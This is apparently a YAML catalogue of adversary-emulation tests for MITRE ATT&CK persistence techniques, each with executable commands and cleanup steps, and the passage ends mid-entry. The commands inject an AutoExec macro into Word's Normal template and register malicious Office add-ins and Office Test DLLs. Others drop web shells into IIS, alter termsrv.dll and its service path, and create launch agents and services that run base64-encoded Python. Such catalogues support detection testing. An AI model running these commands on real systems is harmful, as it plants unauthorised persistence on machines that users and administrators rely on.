      type: powershell
      platform: windows
      command: "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData = \"1\"\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Get the value of the Key/Value pair\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\n# Logical operation to: if the value of the key/value is 1, do nothing - \n# if the value is 0, change it to 1 and create flag1 - \n# if it doesn't exist, create the value and flag2\nif ($value -eq \"1\") \n{\n  Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\n}   \n  elseif ($value -eq \"0\") \n{\n  Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag1\" > $flagPath1\n} \n  else \n{\n  Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag2\" > $flagPath2\n}\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Create copy of orginal template for restoral\nCopy-Item -Path $docPath -Destination $copyPath -Force\n# VBA code to be insterted as a Macro\n# Will create a scheduled task to open the Calculator at 8:04pm daily\n$vbaCode = @\"\n  Sub AutoExec()\n  Dim applicationPath As String\n  Dim taskName As String\n  Dim runTime As String\n  Dim schTasksCmd As String\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\n  taskName = \"OpenCalcTask\"\n  runTime = \"20:04\"\n  schTasksCmd = \"schtasks /create /tn \"\"\" & taskName & \"\"\" /tr \"\"\" & applicationPath & \"\"\" /sc daily /st \" & runTime & \" /f\"\n  Shell \"cmd.exe /c \" & schTasksCmd, vbNormalFocus\n  End Sub\n\"@\n# Create a new instance of Word.Application\n$word = New-Object -ComObject Word.Application\n# Keep the Word application hidden\n$word.Visible = $false\n# Open the document\n$document = $word.Documents.Open($docPath)\n# Access the VBA project of the document\n$vbaProject = $document.VBProject\n# Add a new module to the VBA project\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\n# Add the VBA code to the new module\n$newModule.CodeModule.AddFromString($vbaCode)\n# Run the Macro\n$word.run(\"AutoExec\")\n# Save and close the document\n$document.SaveAs($docPath)\n$document.Close()\n# Quit Word\n$word.Quit()\n# Release COM objects\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null"
      cleanup: "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData1 = \"1\"\n$registryData0 = \"0\"\n# Defines the path each flag file created depending on the original registry state\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Delete the scheduled task created by the Macro\nschtasks /Delete /TN \"OpenCalcTask\" /F | Out-Null\n#Restore the orginal template if the backup copy exists\nif (Test-Path $copyPath)\n{\n  #Delete the injected template\n  Remove-Item -Force $docPath -ErrorAction SilentlyContinue\n  # Restore the original template\n  Rename-Item -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue\n  Write-Host \"The original template has been restored\"\n}\n  else\n{\n  Write-Host \"The original template is present\"\n}\n#Restore the original state of the registry key\nif (Test-Path $flagPath1) \n{\n  # The value was originally 0, set back to 0\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0 -PropertyType DWORD -Force | Out-Null\n  Remove-Item -Force $flagPath1 -ErrorAction SilentlyContinue\n  Write-Host \"The original registry state has been restored\"\n} \n  elseif (Test-Path $flagPath2)\n{\n  #The value did not previously exist, delete the value\n  Remove-ItemProperty -Path $registryKey -Name $registryValue | Out-Null\n  Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue | Out-Null\n  Write-Host \"The original registry state has been restored\"\n}\n  else \n{\n  # The value was already 1, do nothing\n  Write-Host \"The value $registryValue already existed in $registryKey.\"\n}"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1137/001
  is_safe: false
- id: T1137.002
  name: Office Test
  description: 'Adversaries may abuse the Microsoft Office "Office Test" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexac...'
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Office Application Startup Test Persistence (HKCU)
      type: powershell
      platform: windows
      command: "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\" /f       \n}\nelse{\n  Write-Host \"32-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\" /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\""
      cleanup: |-
        Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
        Remove-Item "HKCU:\Software\Microsoft\Office test\Special\Perf" -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1137/002
  is_safe: false
- id: T1137.004
  name: Outlook Home Page
  description: |-
    Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)

    Once malicious home pages have been added to the user’s ...
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Install Outlook Home Page Persistence
      type: cmd
      platform: windows
      command: reg.exe add HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://PathToAtomicsFolder\T1137.004\src\T1137.004.html /f
      cleanup: reg.exe delete HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /f >nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1137/004
  is_safe: false
- id: T1137.006
  name: Add-ins
  description: 'Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (C...'
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Code Executed Via Excel Add-in File (XLL)
      type: powershell
      platform: windows
      command: |-
        $excelApp = New-Object -COMObject "Excel.Application"
        if(-not $excelApp.path.contains("Program Files (x86)")){
            Write-Host "64-bit Office"
            $excelApp.RegisterXLL("PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll")
        }
        else{
          Write-Host "32-bit Office"
          $excelApp.RegisterXLL("PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll")
        }
      cleanup: Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
      timeout: 120
    - name: Persistent Code Execution Via Excel Add-in File (XLL)
      type: powershell
      platform: windows
      command: |-
        $excelApp = New-Object -COMObject "Excel.Application"
        if(-not $excelApp.path.contains("Program Files (x86)")){
            Write-Host "64-bit Office"
            Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll"
        }
        else{
          Write-Host "32-bit Office"
          Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll"
        }
        $ver = $excelApp.version
        $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\Excel\Options"
        Remove-Item $ExcelRegPath -ErrorAction Ignore
        New-Item -type Directory $ExcelRegPath | Out-Null
        New-ItemProperty $ExcelRegPath OPEN -value "/R notepad.xll" -propertyType string | Out-Null
        $excelApp.Quit()
        Start-Process "Excel"
      cleanup: |-
        $ver = (New-Object -COMObject "Excel.Application").version
        Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\Excel\Options" -ErrorAction Ignore
        Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
        Start-Sleep 3
        Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.xll" -ErrorAction Ignore
      timeout: 120
    - name: Persistent Code Execution Via Word Add-in File (WLL)
      type: powershell
      platform: windows
      command: "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"        \n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\""
      cleanup: |-
        Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
        Start-Sleep 3
        Remove-Item "$env:APPDATA\Microsoft\Word\Startup\notepad.wll" -ErrorAction Ignore
      timeout: 120
    - name: Persistent Code Execution Via Excel VBA Add-in File (XLAM)
      type: powershell
      platform: windows
      command: "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"        \nStart-Process \"Excel\""
      cleanup: |-
        Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
        Start-Sleep 3
        Remove-Item "$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam" -ErrorAction Ignore
      timeout: 120
    - name: Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)
      type: powershell
      platform: windows
      command: |-
        Copy "PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam" "$env:APPDATA\Microsoft\Addins\notepad.ppam"
        $ver = (New-Object -COMObject "PowerPoint.Application").version
        $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad"
        New-Item -type Directory $ExcelRegPath -Force | Out-Null
        New-ItemProperty $ExcelRegPath "Autoload" -value "1" -propertyType DWORD  | Out-Null
        New-ItemProperty $ExcelRegPath "Path" -value "notepad.ppam" -propertyType string | Out-Null
        Stop-Process -Name "PowerPnt" -ErrorAction Ignore
        Start-Process "PowerPnt"
      cleanup: |-
        $ver = (New-Object -COMObject "PowerPoint.Application").version
        Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad" -ErrorAction Ignore
        Stop-Process -Name "notepad","PowerPnt" -ErrorAction Ignore
        Start-Sleep 3
        Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.ppam"  -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1137/006
  is_safe: false
- id: T1176
  name: Software Extensions
  description: 'Adversaries may abuse software extensions to establish persistent access to victim systems. Software extensions are modular components that enhance or customize the functionality of software applications, including web browsers, Integrated Development Environments (IDEs), and other platforms.(Citation: Chrome Extension C2 Malware)(Citation: Abramovsky VSCode Security) Extensions are typically installed via official marketplaces, app stores, or manually loaded by users, and they often inherit the...'
  tactic: persistence
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Google Chrome Load Unpacked Extension With Command Line
      type: powershell
      platform: windows
      command: |-
        # Chromium
        $chromium =  "https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip"

        # uBlock Origin Lite to test side-loading
        $extension = "https://github.com/uBlockOrigin/uBOL-home/releases/download/uBOLite_2024.11.25.1376/uBOLite_2024.11.25.1376.chromium.mv3.zip"

        Set-Location "$env:TEMP"

        Set-Variable ProgressPreference SilentlyContinue
        Invoke-WebRequest -URI $chromium -OutFile "$env:TEMP\chrome.zip"
        Invoke-WebRequest -URI $extension -OutFile "$env:TEMP\extension.zip"


        Expand-Archive chrome.zip -DestinationPath "$env:TEMP" -Force
        Expand-Archive extension.zip -Force

        Start-Process .\chrome-win\chrome.exe --load-extension="$env:TEMP\extension\" -PassThru
      cleanup: |-
        Set-Location "$env:TEMP"
        Stop-Process -Name chrome -Force
        Remove-Item .\chrome.zip, .\chrome-win, .\extension, .\extension.zip -Recurse -Force
        Set-Variable ProgressPreference Continue
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1176
  is_safe: false
- id: T1505.002
  name: Transport Agent
  description: 'Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers an...'
  tactic: persistence
  platforms:
    - linux
    - windows
  executors:
    - name: Install MS Exchange Transport Agent Persistence
      type: powershell
      platform: windows
      command: |-
        Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll
        Enable-TransportAgent Security Interop Agent
        Get-TransportAgent | Format-List Name,Enabled
      cleanup: |-
        if(Get-Command "Get-TransportAgent" -ErrorAction Ignore){
          Disable-TransportAgent Security Interop Agent
          Uninstall-TransportAgent Security Interop Agent
          Get-TransportAgent
        }
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1505/002
  is_safe: false
- id: T1505.003
  name: Web Shell
  description: |-
    Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)

    In addition to a server-side script, a Web shell may have a client interface program that i...
  tactic: persistence
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Web Shell Written to Disk
      type: cmd
      platform: windows
      command: xcopy /I /Y "PathToAtomicsFolder\T1505.003\src" C:\inetpub\wwwroot
      cleanup: |-
        del C:\inetpub\wwwroot\b.jsp /q >nul 2>&1
        del C:\inetpub\wwwroot\tests.jsp /q >nul 2>&1
        del C:\inetpub\wwwroot\cmd.aspx /q >nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1505/003
  is_safe: false
- id: T1505.004
  name: IIS Components
  description: 'Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version<...'
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Install IIS Module using AppCmd.exe
      type: cmd
      platform: windows
      command: '%windir%\system32\inetsrv\appcmd.exe install module /name:DefaultDocumentModule_Atomic /image:%windir%\system32\inetsrv\defdoc.dll'
      cleanup: '%windir%\system32\inetsrv\appcmd.exe uninstall module DefaultDocumentModule_Atomic'
      timeout: 120
    - name: Install IIS Module using PowerShell Cmdlet New-WebGlobalModule
      type: powershell
      platform: windows
      command: New-WebGlobalModule -Name DefaultDocumentModule_Atomic -Image %windir%\system32\inetsrv\defdoc.dll
      cleanup: Remove-WebGlobalModule -Name DefaultDocumentModule_Atomic
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1505/004
  is_safe: false
- id: T1505.005
  name: Terminal Services DLL
  description: |-
    Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)

    [Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a "generic" process...
  tactic: persistence
  platforms:
    - windows
  executors:
    - name: Simulate Patching termsrv.dll
      type: powershell
      platform: windows
      command: |-
        $termsrvDll = "C:\Windows\System32\termsrv.dll"

        $ACL = Get-Acl $termsrvDll
        $permission = "Administrators","FullControl","Allow"
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
        $ACL.SetAccessRule($accessRule)
        Set-Acl -Path $termsrvDll -AclObject $ACL

        Copy-Item -Path "C:\Windows\System32\termsrv.dll" -Destination "C:\Windows\System32\termsrv_backup.dll" -ErrorAction Ignore
        Add-Content -Path "C:\Windows\System32\termsrv.dll" -Value "`n" -NoNewline -ErrorAction Ignore
        Move-Item -Path "C:\Windows\System32\termsrv_backup.dll" -Destination "C:\Windows\System32\termsrv.dll" -Force -ErrorAction Ignore
      cleanup: Move-Item -Path "C:\Windows\System32\termsrv_backup.dll" -Destination "C:\Windows\System32\termsrv.dll" -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Modify Terminal Services DLL Path
      type: powershell
      platform: windows
      command: |-
        $termsrvDll = "C:\Windows\System32\termsrv.dll"

        $ACL = Get-Acl $termsrvDll
        $permission = "Administrators","FullControl","Allow"
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
        $ACL.SetAccessRule($accessRule)
        Set-Acl -Path $termsrvDll -AclObject $ACL

        Copy-Item -Path $termsrvDll -Destination "$HOME\AtomicTest.dll"

        $newServiceDll = "$HOME\AtomicTest.dll"

        $registryPath = "HKLM:\System\CurrentControlSet\services\TermService\Parameters"

        # Check if the registry key exists
        if (Test-Path -Path $registryPath) {
            # Modify the ServiceDll value in the registry
            Set-ItemProperty -Path $registryPath -Name "ServiceDll" -Value $newServiceDll
            Write-Host "ServiceDll value in the registry has been updated to: $newServiceDll"
        } else {
            Write-Host "Registry key not found. Make sure the 'TermService\Parameters' key exists."
        }
      cleanup: Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\TermService\Parameters" -Name "ServiceDll" -Value "C:\Windows\System32\termsrv.dll"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1505/005
  is_safe: false
- id: T1542.001
  name: System Firmware
  description: |-
    Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)

    System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adve...
  tactic: persistence
  tactics:
    - persistence
    - defense-evasion
  platforms:
    - windows
  executors:
    - name: UEFI Persistence via Wpbbin.exe File Creation
      type: powershell
      platform: windows
      command: "echo \"Creating %systemroot%\\wpbbin.exe\"      \nNew-Item -ItemType File -Path \"$env:SystemRoot\\System32\\wpbbin.exe\""
      cleanup: "echo \"Removing %systemroot%\\wpbbin.exe\" \nRemove-Item -Path \"$env:SystemRoot\\System32\\wpbbin.exe\""
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1542/001
  is_safe: false
- id: T1543.001
  name: Launch Agent
  description: 'Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac ...'
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
  executors:
    - name: Launch Agent
      type: bash
      platform: macos
      command: |-
        if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
        sudo cp $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist ~/Library/LaunchAgents/com.atomicredteam.plist
        sudo launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist
      cleanup: |-
        sudo launchctl unload ~/Library/LaunchAgents/com.atomicredteam.plist
        sudo rm ~/Library/LaunchAgents/com.atomicredteam.plist
      timeout: 60
      elevation_required: true
    - name: Event Monitor Daemon Persistence
      type: bash
      platform: macos
      command: |-
        sudo cp $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist /etc/emond.d/rules/atomicredteam_T1543_001.plist
        sudo touch /private/var/db/emondClients/randomflag
      cleanup: |-
        sudo rm /etc/emond.d/rules/atomicredteam_T1543_001.plist
        sudo rm /private/var/db/emondClients/randomflag
      timeout: 60
      elevation_required: true
    - name: Launch Agent - Root Directory
      type: bash
      platform: macos
      command: |-
        sudo cp $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist /Library/LaunchAgents/com.atomicredteam.T1543.001.plist
        launchctl load -w /Library/LaunchAgents/com.atomicredteam.T1543.001.plist
      cleanup: |-
        launchctl unload /Library/LaunchAgents/com.atomicredteam.T1543.001.plist
        sudo rm /Library/LaunchAgents/com.atomicredteam.T1543.001.plist
        sudo rm /tmp/T1543_001_atomicredteam.txt
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1543/001
  is_safe: false
- id: T1543.002
  name: Systemd Service
  description: "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \n\nSyst..."
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - linux
  executors:
    - name: Create Systemd Service
      type: bash
      platform: linux
      command: |-
        echo "[Unit]" > /etc/systemd/system/art-systemd-service.service
        echo "Description=Atomic Red Team Systemd Service" >> /etc/systemd/system/art-systemd-service.service
        echo "" >> /etc/systemd/system/art-systemd-service.service
        echo "[Service]" >> /etc/systemd/system/art-systemd-service.service
        echo "Type=simple"
        echo "ExecStart=/bin/touch /tmp/art-systemd-execstart-marker" >> /etc/systemd/system/art-systemd-service.service
        echo "ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker" >> /etc/systemd/system/art-systemd-service.service
        echo "ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker" >> /etc/systemd/system/art-systemd-service.service
        echo "ExecReload=/bin/touch /tmp/art-systemd-execreload-marker" >> /etc/systemd/system/art-systemd-service.service
        echo "ExecStop=/bin/touch /tmp/art-systemd-execstop-marker" >> /etc/systemd/system/art-systemd-service.service
        echo "ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker" >> /etc/systemd/system/art-systemd-service.service
        echo "" >> /etc/systemd/system/art-systemd-service.service
        echo "[Install]" >> /etc/systemd/system/art-systemd-service.service
        echo "WantedBy=default.target" >> /etc/systemd/system/art-systemd-service.service
        systemctl daemon-reload
        systemctl enable art-systemd-service.service
        systemctl start art-systemd-service.service
      cleanup: |-
        systemctl stop art-systemd-service.service
        systemctl disable art-systemd-service.service
        rm -rf /etc/systemd/system/art-systemd-service.service
        systemctl daemon-reload
      timeout: 60
      elevation_required: true
    - name: Create SysV Service
      type: sh
      platform: linux
      command: "echo '#\\!/bin/sh' > /usr/local/etc/rc.d/art-test\necho ' ' >> /usr/local/etc/rc.d/art-test\necho '#' >> /usr/local/etc/rc.d/art-test\necho '# PROVIDE: art-test' >> /usr/local/etc/rc.d/art-test\necho '# REQUIRE: LOGIN' >> /usr/local/etc/rc.d/art-test\necho '# KEYWORD: shutdown' >> /usr/local/etc/rc.d/art-test\necho ' ' >> /usr/local/etc/rc.d/art-test\necho '. /etc/rc.subr' >> /usr/local/etc/rc.d/art-test\necho ' ' >> /usr/local/etc/rc.d/art-test\necho 'name=\"art_test\"' >> /usr/local/etc/rc.d/art-test\necho 'rcvar=art_test_enable' >> /usr/local/etc/rc.d/art-test\necho 'load_rc_config ${name}' >> /usr/local/etc/rc.d/art-test\necho 'command=\"/usr/bin/touch\"' >> /usr/local/etc/rc.d/art-test\necho 'start_cmd=\"art_test_start\"' >> /usr/local/etc/rc.d/art-test\necho '' >> /usr/local/etc/rc.d/art-test\necho 'art_test_start()' >> /usr/local/etc/rc.d/art-test     \necho '{' >> /usr/local/etc/rc.d/art-test\necho '  ${command} /tmp/art-test.marker' >> /usr/local/etc/rc.d/art-test\necho '}' >> /usr/local/etc/rc.d/art-test\necho ' ' >> /usr/local/etc/rc.d/art-test     \necho 'run_rc_command \"$1\"' >> /usr/local/etc/rc.d/art-test\nchmod +x /usr/local/etc/rc.d/art-test\nservice art-test enable\nservice art-test start"
      cleanup: |-
        sysrc -x art_test_enable
        rm -f /usr/local/etc/rc.d/art-test
      timeout: 60
      elevation_required: true
    - name: Create Systemd Service file,  Enable the service , Modify and Reload the service.
      type: bash
      platform: linux
      command: |-
        echo "#!/bin/bash" > /etc/init.d/T1543.002
        echo "### BEGIN INIT INFO" >> /etc/init.d/T1543.002
        echo "# Provides : Atomic Test T1543.002" >> /etc/init.d/T1543.002
        echo "# Required-Start: \$all" >> /etc/init.d/T1543.002
        echo "# Required-Stop : " >> /etc/init.d/T1543.002
        echo "# Default-Start: 2 3 4 5" >> /etc/init.d/T1543.002
        echo "# Default-Stop: " >> /etc/init.d/T1543.002
        echo "# Short Description: Atomic Test for Systemd Service Creation" >> /etc/init.d/T1543.002
        echo "### END INIT INFO" >> /etc/init.d/T1543.002
        echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \" " >> /etc/init.d/T1543.002
        chmod +x /etc/init.d/T1543.002
        if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID="centos"') ]; then chkconfig T1543.002 on ; else echo "Please run this test on Ubnutu , kali OR centos" ; fi
        systemctl enable T1543.002
        systemctl start T1543.002
        echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\"" | sudo tee -a /etc/init.d/T1543.002
        systemctl daemon-reload
        systemctl restart T1543.002
      cleanup: |-
        systemctl stop T1543.002
        systemctl disable T1543.002
        rm -rf /etc/init.d/T1543.002
        systemctl daemon-reload
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1543/002
  is_safe: false
- id: T1543.003
  name: Windows Service
  description: |-
    Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.

    Adversaries may install a new service or modify an existing service to execute ...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Modify Fax service to run PowerShell
      type: cmd
      platform: windows
      command: |-
        sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\""
        sc start Fax
      cleanup: sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe" >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Service Installation CMD
      type: cmd
      platform: windows
      command: |-
